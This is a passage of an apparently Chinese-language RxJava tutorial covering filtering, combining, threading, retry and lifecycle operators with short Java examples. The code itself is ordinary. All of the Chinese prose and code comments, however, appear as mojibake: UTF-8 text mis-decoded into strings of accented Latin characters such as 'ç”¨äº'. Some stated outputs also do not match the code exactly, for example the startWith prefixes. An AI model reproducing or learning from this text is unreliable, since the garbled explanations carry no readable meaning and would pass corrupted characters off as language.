<p>distinctUntilChanged() ç”¨äºè¿‡æ»¤æ‰è¿ç»­é‡å¤çš„æ•°æ®ï¼Œåªä¿ç•™å‘ç”Ÿå˜åŒ–çš„æ•°æ®ã€‚
æ ¸å¿ƒæ€æƒ³ï¼šå»é‡ï¼Œä½†åªå»é‡è¿ç»­ç›¸åŒçš„å€¼ï¼Œä¸è¿ç»­å‡ºç°çš„ç›¸åŒå€¼ä¼šè¢«ä¿ç•™ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)
                .distinctUntilChanged()
                .subscribe(num -&gt; System.out.print(num + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// 1 2 1 3 2 1</span>

        <span class="hljs-comment">// è§£é‡Šï¼š</span>
        <span class="hljs-comment">// åŸå§‹: 1, 1, 2, 2, 1, 3, 3, 2, 2, 1</span>
        <span class="hljs-comment">// å»é‡è¿ç»­é‡å¤å: 1, 2, 1, 3, 2, 1</span>
        <span class="hljs-comment">// æ³¨æ„ï¼šä¸­é—´çš„ 1 è™½ç„¶å‡ºç°è¿‡ï¼Œä½†å› ä¸ºä¸è¿ç»­ï¼Œæ‰€ä»¥ä¿ç•™äº†</span>
    }
</code></pre>
<h4 data-id="heading-35">take</h4>
<p>take() ç”¨äºä» Observable çš„å¼€å¤´å–å‡ºæŒ‡å®šæ•°é‡çš„æ•°æ®ï¼Œç„¶åå®Œæˆã€‚
æ ¸å¿ƒæ€æƒ³ï¼šåªå–å‰ N ä¸ªæ•°æ®ï¼Œä¹‹åçš„æ•°æ®å¿½ç•¥ï¼ŒObservable æå‰å®Œæˆã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)  <span class="hljs-comment">// å‘å°„1-10</span>
                .take(<span class="hljs-number">3</span>)             <span class="hljs-comment">// åªå–å‰3ä¸ª</span>
                .subscribe(
                        num -&gt; System.out.print(num + <span class="hljs-string">" "</span>),
                        error -&gt; {
                        },
                        () -&gt; System.out.println(<span class="hljs-string">"\nå·²å®Œæˆ"</span>)
                );

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// 1 2 3</span>
        <span class="hljs-comment">// å·²å®Œæˆ</span>
        <span class="hljs-comment">// æ³¨æ„ï¼š4-10 ä¸ä¼šè¢«å‘å°„</span>
    }
</code></pre>
<h4 data-id="heading-36">firstElement &amp; lastElement &amp; elementAt</h4>
<p>è¿™ä¸‰ä¸ªæ“ä½œç¬¦éƒ½ç”¨äºä» Observable ä¸­å–å‡ºç‰¹å®šä½ç½®çš„å•ä¸ªå…ƒç´ ï¼š</p>
<ul>
<li><strong><code>firstElement()</code></strong>ï¼šå–ç¬¬ä¸€ä¸ªå…ƒç´ </li>
<li><strong><code>lastElement()</code></strong>ï¼šå–æœ€åä¸€ä¸ªå…ƒç´ </li>
<li><strong><code>elementAt(index)</code></strong>ï¼šå–æŒ‡å®šç´¢å¼•ä½ç½®çš„å…ƒç´ </li>
</ul>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.range(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)  <span class="hljs-comment">// 1,2,3,4,5</span>
                .firstElement()      <span class="hljs-comment">// å–ç¬¬ä¸€ä¸ª</span>
                .subscribe(
                        num -&gt; System.out.println(<span class="hljs-string">"ç¬¬ä¸€ä¸ª: "</span> + num),
                        error -&gt; {
                        },
                        () -&gt; System.out.println(<span class="hljs-string">"æ²¡æœ‰ç¬¬ä¸€ä¸ªå…ƒç´ "</span>)
                );

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// ç¬¬ä¸€ä¸ª: 1</span>
    }
</code></pre>
<h3 data-id="heading-37">ç»„åˆæ“ä½œç¬¦</h3>
<p>ç»„åˆæ“ä½œç¬¦æ˜¯ RxJava ä¸­ç”¨äºå°†å¤šä¸ª Observable ç»„åˆæˆä¸€ä¸ª Observable çš„æ“ä½œç¬¦ã€‚å®ƒä»¬å¤„ç†å¤šä¸ªæ•°æ®æµä¹‹é—´çš„å…³ç³»ï¼Œå®ç°æµçš„åˆå¹¶ã€è¿æ¥ã€ç»„åˆç­‰æ“ä½œã€‚</p>
<h4 data-id="heading-38">concat</h4>
<p>concat() ç”¨äºé¡ºåºè¿æ¥å¤šä¸ª Observableï¼Œå‰ä¸€ä¸ª Observable å®Œæˆåï¼Œæ‰å¼€å§‹å‘å°„ä¸‹ä¸€ä¸ª Observable çš„æ•°æ®ã€‚
æ ¸å¿ƒæ€æƒ³ï¼šä¸²è¡Œè¿æ¥ï¼Œä¿æŒé¡ºåºï¼Œåƒæ’é˜Ÿä¸€æ ·ä¸€ä¸ªæ¥ä¸€ä¸ªã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable&lt;String&gt; first = Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);
        Observable&lt;String&gt; second = Observable.just(<span class="hljs-string">"D"</span>, <span class="hljs-string">"E"</span>, <span class="hljs-string">"F"</span>);
        Observable&lt;String&gt; third = Observable.just(<span class="hljs-string">"G"</span>, <span class="hljs-string">"H"</span>);

        Observable.concat(first, second, third)
                .subscribe(
                        letter -&gt; System.out.print(letter + <span class="hljs-string">" "</span>),
                        error -&gt; {
                        },
                        () -&gt; System.out.println(<span class="hljs-string">"\nå…¨éƒ¨å®Œæˆ"</span>)
                );

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// A B C D E F G H</span>
        <span class="hljs-comment">// å…¨éƒ¨å®Œæˆ</span>
        <span class="hljs-comment">// ä¸¥æ ¼æŒ‰ç…§ first â†’ second â†’ third çš„é¡ºåº</span>
    }
</code></pre>
<h4 data-id="heading-39">concatArray</h4>
<p>concatArray() æ˜¯ concat() çš„æ•°ç»„ç‰ˆæœ¬ï¼Œç”¨äºé¡ºåºè¿æ¥å¤šä¸ª Observableï¼ˆä»¥æ•°ç»„å½¢å¼æä¾›ï¼‰ï¼ŒåŠŸèƒ½ä¸ concat() å®Œå…¨ç›¸åŒï¼Œåªæ˜¯å‚æ•°å½¢å¼ä¸åŒã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// åˆ›å»ºObservableæ•°ç»„</span>
        Observable&lt;String&gt;[] observables = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Observable</span>[]{
                Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>),
                Observable.just(<span class="hljs-string">"C"</span>, <span class="hljs-string">"D"</span>, <span class="hljs-string">"E"</span>),
                Observable.just(<span class="hljs-string">"F"</span>, <span class="hljs-string">"G"</span>)
        };

        <span class="hljs-comment">// ä½¿ç”¨ concatArray è¿æ¥</span>
        Observable.concatArray(observables)
                .subscribe(letter -&gt; System.out.print(letter + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// A B C D E F G</span>
        <span class="hljs-comment">// é¡ºåºè¿æ¥æ‰€æœ‰æ•°ç»„ä¸­çš„Observable</span>
    }
</code></pre>
<h4 data-id="heading-40">merge</h4>
<p>merge() ç”¨äºå¹¶å‘åˆå¹¶å¤šä¸ª Observableï¼Œå°†æ‰€æœ‰æ•°æ®æŒ‰å®é™…åˆ°è¾¾æ—¶é—´é¡ºåºæ··åˆå‘å°„ã€‚</p>
<p>æ ¸å¿ƒæ€æƒ³ï¼šå¹¶è¡Œæ‰§è¡Œï¼Œè°å…ˆåˆ°è°å…ˆå‡ºï¼Œåƒå¤šè½¦é“åˆå¹¶æˆå•è½¦é“ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        Observable&lt;Long&gt; fast = Observable.interval(<span class="hljs-number">100</span>, TimeUnit.MILLISECONDS)
                .map(i -&gt; i + <span class="hljs-number">100</span>)  <span class="hljs-comment">// 100, 101, 102...</span>
                .take(<span class="hljs-number">3</span>);
        Observable&lt;Long&gt; slow = Observable.interval(<span class="hljs-number">200</span>, TimeUnit.MILLISECONDS)
                .map(i -&gt; i + <span class="hljs-number">200</span>)  <span class="hljs-comment">// 200, 201, 202...</span>
                .take(<span class="hljs-number">3</span>);

        Observable.merge(fast, slow)
                .subscribe(num -&gt; System.out.print(num + <span class="hljs-string">" "</span>));

        Thread.sleep(<span class="hljs-number">1000</span>);

        <span class="hljs-comment">// è¾“å‡ºï¼ˆå®é™…æ—¶é—´é¡ºåºï¼‰ï¼š</span>
        <span class="hljs-comment">// 100 101 200 102 201 202</span>
        <span class="hljs-comment">// è§£é‡Šï¼š</span>
        <span class="hljs-comment">// 100ms: fastå‘å°„100</span>
        <span class="hljs-comment">// 200ms: slowå‘å°„200, fastå‘å°„101</span>
        <span class="hljs-comment">// 300ms: fastå‘å°„102</span>
        <span class="hljs-comment">// 400ms: slowå‘å°„201</span>
        <span class="hljs-comment">// 600ms: slowå‘å°„202</span>
    }
</code></pre>
<h4 data-id="heading-41">zip</h4>
<p>zip() ç”¨äºå°†å¤šä¸ª Observable çš„æ•°æ®æŒ‰ç´¢å¼•é…å¯¹ç»„åˆï¼Œåƒæ‹‰é“¾ä¸€æ ·ä¸€ä¸€å¯¹åº”ã€‚</p>
<p>æ ¸å¿ƒæ€æƒ³ï¼šç­‰å¾…æ‰€æœ‰Observableéƒ½æœ‰æ•°æ®ï¼Œç„¶åé…å¯¹å‘å°„ï¼Œä»¥æœ€çŸ­çš„Observableä¸ºå‡†ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable&lt;String&gt; letters = Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>, <span class="hljs-string">"D"</span>);
        Observable&lt;Integer&gt; numbers = Observable.just(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);

        Observable.zip(
                        letters,
                        numbers,
                        (letter, number) -&gt; letter + number
                )
                .subscribe(result -&gt; System.out.print(result + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// A1 B2 C3</span>
        <span class="hljs-comment">// æ³¨æ„ï¼šD è¢«ä¸¢å¼ƒäº†ï¼Œå› ä¸º numbers åªæœ‰3ä¸ª</span>

    }
</code></pre>
<h4 data-id="heading-42">startWith &amp; startWithArray</h4>
<p>è¿™ä¸¤ä¸ªæ“ä½œç¬¦éƒ½ç”¨äºåœ¨ Observable å‘å°„æ•°æ®ä¹‹å‰ï¼Œå…ˆå‘å°„ä¸€äº›æŒ‡å®šçš„æ•°æ®ï¼Œå°±åƒç»™æ•°æ®æµæ·»åŠ "å¼€åœºç™½"ã€‚</p>
<ul>
<li>startWith()ï¼šæ·»åŠ å•ä¸ªå…ƒç´ æˆ– Observableã€‚</li>
<li>startWithArray()ï¼šæ·»åŠ å¤šä¸ªå…ƒç´ ï¼ˆå¯å˜å‚æ•°ï¼‰ã€‚</li>
</ul>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// startWith: æ·»åŠ å•ä¸ªå…ƒç´ </span>
        Observable.just(<span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)
                .startWith(<span class="hljs-string">"A"</span>)
                .subscribe(letter -&gt; System.out.print(<span class="hljs-string">"startWith: "</span> + letter + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// startWithArray: æ·»åŠ å¤šä¸ªå…ƒç´ </span>
        Observable.just(<span class="hljs-string">"D"</span>, <span class="hljs-string">"E"</span>)
                .startWithArray(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)
                .subscribe(letter -&gt; System.out.print(<span class="hljs-string">"startWithArray: "</span> + letter + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// startWith: A B C</span>
        <span class="hljs-comment">// startWithArray: A B C D E</span>
    }
</code></pre>
<h4 data-id="heading-43">count</h4>
<p>count() ç”¨äºç»Ÿè®¡ Observable å‘å°„çš„å…ƒç´ æ•°é‡ï¼Œè¿”å›ä¸€ä¸ªå‘å°„å•ä¸ªè®¡æ•°å€¼çš„ Observableã€‚</p>
<p>æ ¸å¿ƒæ€æƒ³ï¼šæ•°ä¸€æ•°å‘å°„äº†å¤šå°‘ä¸ªå…ƒç´ ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>, <span class="hljs-string">"D"</span>, <span class="hljs-string">"E"</span>)
                .count()
                .subscribe(count -&gt;
                        System.out.println(<span class="hljs-string">"å…ƒç´ æ•°é‡: "</span> + count)
                );

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// å…ƒç´ æ•°é‡: 5</span>
    }
</code></pre>
<h3 data-id="heading-44">åŠŸèƒ½æ“ä½œç¬¦</h3>
<p>åŠŸèƒ½æ“ä½œç¬¦æ˜¯ RxJava ä¸­ç”¨äºè¾…åŠ©è°ƒè¯•ã€ç›‘æ§ã€é”™è¯¯å¤„ç†ã€èµ„æºç®¡ç†å’Œå·¥å…·æ€§åŠŸèƒ½çš„æ“ä½œç¬¦ã€‚å®ƒä»¬ä¸ç›´æ¥å¤„ç†æ•°æ®æµï¼Œè€Œæ˜¯æä¾›è¾…åŠ©åŠŸèƒ½ã€‚</p>
<h4 data-id="heading-45">delay</h4>
<p>delay() ç”¨äºå»¶è¿Ÿå‘å°„ Observable çš„æ•°æ®ï¼Œå¯ä»¥å»¶è¿Ÿæ•´ä¸ªæµï¼Œä¹Ÿå¯ä»¥å»¶è¿Ÿæ¯ä¸ªå…ƒç´ ã€‚
æ ¸å¿ƒæ€æƒ³ï¼šè®©æ•°æ®"ç­‰ä¸€ä¼šå„¿"å†å‘å°„ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        System.out.println(<span class="hljs-string">"å¼€å§‹æ—¶é—´: "</span> + System.currentTimeMillis());

        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)
                .delay(<span class="hljs-number">1</span>, TimeUnit.SECONDS)  <span class="hljs-comment">// å»¶è¿Ÿ1ç§’</span>
                .subscribe(item -&gt;
                        System.out.println(System.currentTimeMillis() + <span class="hljs-string">": "</span> + item)
                );

        Thread.sleep(<span class="hljs-number">2000</span>);

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// å¼€å§‹æ—¶é—´: 1766569373459</span>
        <span class="hljs-comment">// 1766569374574: A</span>
        <span class="hljs-comment">// 1766569374580: B</span>
        <span class="hljs-comment">// 1766569374580: C</span>
        <span class="hljs-comment">// æ³¨æ„ï¼šA,B,Cå‡ ä¹åŒæ—¶å‘å°„ï¼Œéƒ½å»¶è¿Ÿäº†1ç§’</span>
    }
</code></pre>
<h4 data-id="heading-46">subscribeOn &amp; observerOn</h4>
<p>è¿™ä¸¤ä¸ªæ“ä½œç¬¦ç”¨äºæ§åˆ¶ Observable åœ¨å“ªä¸ªçº¿ç¨‹ä¸Šæ‰§è¡Œå’Œè§‚å¯Ÿï¼Œæ˜¯ RxJava çº¿ç¨‹è°ƒåº¦çš„æ ¸å¿ƒã€‚</p>
<ul>
<li><strong><code>subscribeOn()</code></strong>ï¼šæŒ‡å®š Observable æ‰§è¡Œåœ¨å“ªä¸ªçº¿ç¨‹</li>
<li><strong><code>observeOn()</code></strong>ï¼šæŒ‡å®š Observer è§‚å¯Ÿåœ¨å“ªä¸ªçº¿ç¨‹</li>
</ul>
<p>subscribeOn ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        Observable.create(emitter -&gt; {
                    System.out.println(<span class="hljs-string">"æ‰§è¡Œçº¿ç¨‹: "</span> + Thread.currentThread().getName());
                    emitter.onNext(<span class="hljs-string">"æ•°æ®"</span>);
                    emitter.onComplete();
                })
                .subscribeOn(Schedulers.io())  <span class="hljs-comment">// åœ¨IOçº¿ç¨‹æ‰§è¡Œ</span>
                .subscribe(data -&gt;
                        System.out.println(<span class="hljs-string">"æ¥æ”¶çº¿ç¨‹: "</span> + Thread.currentThread().getName())
                );

        Thread.sleep(<span class="hljs-number">1000</span>);

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// æ‰§è¡Œçº¿ç¨‹: RxCachedThreadScheduler-1</span>
        <span class="hljs-comment">// æ¥æ”¶çº¿ç¨‹: RxCachedThreadScheduler-1</span>
        <span class="hljs-comment">// æ³¨æ„ï¼šæ‰§è¡Œå’Œæ¥æ”¶éƒ½åœ¨IOçº¿ç¨‹</span>
    }
</code></pre>
<p>observeOn ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        Observable.create(emitter -&gt; {
                    System.out.println(<span class="hljs-string">"æ‰§è¡Œçº¿ç¨‹: "</span> + Thread.currentThread().getName());
                    emitter.onNext(<span class="hljs-string">"æ•°æ®"</span>);
                    emitter.onComplete();
                })
                .observeOn(Schedulers.io())  <span class="hljs-comment">// åœ¨IOçº¿ç¨‹æ¥æ”¶</span>
                .subscribe(data -&gt;
                        System.out.println(<span class="hljs-string">"æ¥æ”¶çº¿ç¨‹: "</span> + Thread.currentThread().getName())
                );

        Thread.sleep(<span class="hljs-number">1000</span>);

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// æ‰§è¡Œçº¿ç¨‹: main</span>
        <span class="hljs-comment">// æ¥æ”¶çº¿ç¨‹: RxCachedThreadScheduler-1</span>
        <span class="hljs-comment">// æ³¨æ„ï¼šæ‰§è¡Œåœ¨ä¸»çº¿ç¨‹ï¼Œæ¥æ”¶åœ¨IOçº¿ç¨‹</span>
    }
</code></pre>
<h4 data-id="heading-47">retry</h4>
<p>retry ç”¨äºåœ¨ Observable å‘ç”Ÿé”™è¯¯æ—¶è‡ªåŠ¨é‡è¯•ï¼Œå®ç°é”™è¯¯æ¢å¤æœºåˆ¶ï¼Œç›´åˆ°æˆåŠŸæˆ–è¾¾åˆ°é‡è¯•ä¸Šé™ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">attempt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>();

        Observable.create(emitter -&gt; {
                    attempt.getAndIncrement();
                    System.out.println(<span class="hljs-string">"ç¬¬"</span> + attempt + <span class="hljs-string">"æ¬¡å°è¯•"</span>);
                    <span class="hljs-keyword">if</span> (attempt.get() &lt; <span class="hljs-number">3</span>) {
                        emitter.onError(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"éšæœºå¤±è´¥"</span>));
                    } <span class="hljs-keyword">else</span> {
                        emitter.onNext(<span class="hljs-string">"æˆåŠŸ"</span>);
                        emitter.onComplete();
                    }
                })
                .retry(<span class="hljs-number">2</span>)  <span class="hljs-comment">// æœ€å¤šé‡è¯•2æ¬¡</span>
                .subscribe(
                        data -&gt; System.out.println(<span class="hljs-string">"ç»“æœ: "</span> + data),
                        error -&gt; System.err.println(<span class="hljs-string">"æœ€ç»ˆå¤±è´¥: "</span> + error.getMessage())
                );

    <span class="hljs-comment">// è¾“å‡ºï¼š</span>
    <span class="hljs-comment">// ç¬¬1æ¬¡å°è¯•</span>
    <span class="hljs-comment">// ç¬¬2æ¬¡å°è¯•</span>
    <span class="hljs-comment">// ç¬¬3æ¬¡å°è¯•</span>
    <span class="hljs-comment">// ç»“æœ: æˆåŠŸ</span>
    <span class="hljs-comment">// å°è¯•3æ¬¡åæˆåŠŸï¼ˆåˆå§‹1æ¬¡+é‡è¯•2æ¬¡ï¼‰</span>
    }
</code></pre>
<h4 data-id="heading-48">retryUntil</h4>
<p>retryUntil ç”¨äºè‡ªå®šä¹‰é‡è¯•åœæ­¢æ¡ä»¶ï¼Œå½“æ¡ä»¶æ»¡è¶³æ—¶åœæ­¢é‡è¯•ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">attempt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
        Observable.create(emitter -&gt; {
                    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> attempt.incrementAndGet();
                    System.out.println(<span class="hljs-string">"ç¬¬"</span> + count + <span class="hljs-string">"æ¬¡å°è¯•"</span>);
                    <span class="hljs-keyword">if</span> (count &lt; <span class="hljs-number">3</span>) {
                        emitter.onError(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"å¤±è´¥"</span>));
                    } <span class="hljs-keyword">else</span> {
                        emitter.onNext(<span class="hljs-string">"æˆåŠŸ"</span>);
                        emitter.onComplete();
                    }
                })
                .retryUntil(() -&gt; {
                    <span class="hljs-comment">// è¿”å› true æ—¶åœæ­¢é‡è¯•</span>
                    <span class="hljs-keyword">return</span> attempt.get() &gt;= <span class="hljs-number">3</span>;  <span class="hljs-comment">// å°è¯•3æ¬¡ååœæ­¢</span>
                })
                .subscribe(
                        data -&gt; System.out.println(<span class="hljs-string">"ç»“æœ: "</span> + data),
                        error -&gt; System.err.println(<span class="hljs-string">"æœ€ç»ˆå¤±è´¥: "</span> + error.getMessage())
                );

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// ç¬¬1æ¬¡å°è¯•</span>
        <span class="hljs-comment">// ç¬¬2æ¬¡å°è¯•</span>
        <span class="hljs-comment">// ç¬¬3æ¬¡å°è¯•</span>
        <span class="hljs-comment">// ç»“æœ: æˆåŠŸ</span>
    }
</code></pre>
<h3 data-id="heading-49">ç”Ÿå‘½å‘¨æœŸçš„åŠŸèƒ½æ“ä½œç¬¦</h3>
<p>å¾ˆå¤šåŠŸèƒ½æ“ä½œç¬¦è´¯ç©¿æ•´ä¸ªå‘å¸ƒè®¢é˜…çš„ç”Ÿå‘½å‘¨æœŸä¸­ã€‚</p>
<h4 data-id="heading-50">doOnSubscribe- è®¢é˜…æ—¶</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)
                .doOnSubscribe(disposable -&gt;
                        System.out.println(<span class="hljs-string">"æœ‰äººè®¢é˜…äº†ï¼"</span>)
                )
                .subscribe();
        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// æœ‰äººè®¢é˜…äº†ï¼</span>
    }
</code></pre>
<h4 data-id="heading-51">doOnNext - å‘å°„æ¯ä¸ªå…ƒç´ æ—¶</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.range(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>)
                .doOnNext(num -&gt;
                        System.out.println(<span class="hljs-string">"å³å°†å‘å°„: "</span> + num)
                )
                .map(num -&gt; num * <span class="hljs-number">2</span>)
                .doOnNext(num -&gt;
                        System.out.println(<span class="hljs-string">"å‘å°„å: "</span> + num)
                )
                .subscribe();

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// å³å°†å‘å°„: 1</span>
        <span class="hljs-comment">// å‘å°„å: 2</span>
        <span class="hljs-comment">// å³å°†å‘å°„: 2</span>
        <span class="hljs-comment">// å‘å°„å: 4</span>
        <span class="hljs-comment">// å³å°†å‘å°„: 3</span>
        <span class="hljs-comment">// å‘å°„å: 6</span>
    }
</code></pre>
<h4 data-id="heading-52">doAfterNext - å‘å°„åæ‰§è¡Œ</h4>
<pre><code class="hljs language-java" lang="java">Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)
    .doOnNext(item -&gt; 
        System.out.println(<span class="hljs-string">"å‘å°„å‰: "</span> + item)
    )
    .doAfterNext(item -&gt; 
        System.out.println(<span class="hljs-string">"å‘å°„å: "</span> + item)
    )
    .subscribe(item -&gt; 
        System.out.println(<span class="hljs-string">"æ¥æ”¶: "</span> + item)
    );

<span class="hljs-comment">// è¾“å‡ºï¼š</span>
<span class="hljs-comment">// å‘å°„å‰: A</span>
<span class="hljs-comment">// æ¥æ”¶: A</span>
<span class="hljs-comment">// å‘å°„å: A</span>
<span class="hljs-comment">// å‘å°„å‰: B</span>
<span class="hljs-comment">// æ¥æ”¶: B</span>
<span class="hljs-comment">// å‘å°„å: B</span>
<span class="hljs-comment">// å‘å°„å‰: C</span>
<span class="hljs-comment">// æ¥æ”¶: C</span>
<span class="hljs-comment">// å‘å°„å: C</span>
</code></pre>
<h4 data-id="heading-53">doOnError - å‡ºé”™æ—¶</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.error(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"æµ‹è¯•é”™è¯¯"</span>))
                .doOnError(error -&gt;
                        System.err.println(<span class="hljs-string">"æ•è·åˆ°é”™è¯¯: "</span> + error.getMessage())
                )
                .onErrorReturnItem(<span class="hljs-string">"é»˜è®¤å€¼"</span>)
                .subscribe();

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// æ•è·åˆ°é”™è¯¯: æµ‹è¯•é”™è¯¯</span>
    }
</code></pre>
<h4 data-id="heading-54">doOnComplete - å®Œæˆæ—¶</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-string">"ä»»åŠ¡1"</span>, <span class="hljs-string">"ä»»åŠ¡2"</span>)
                .doOnComplete(() -&gt;
                        System.out.println(<span class="hljs-string">"æ‰€æœ‰ä»»åŠ¡éƒ½å®Œæˆäº†ï¼"</span>)
                )
                .subscribe();

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// æ‰€æœ‰ä»»åŠ¡éƒ½å®Œæˆäº†ï¼</span>
    }
</code></pre>
<h4 data-id="heading-55">doOnTerminate - å®Œæˆ/é”™è¯¯å‰æ‰§è¡Œ</h4>
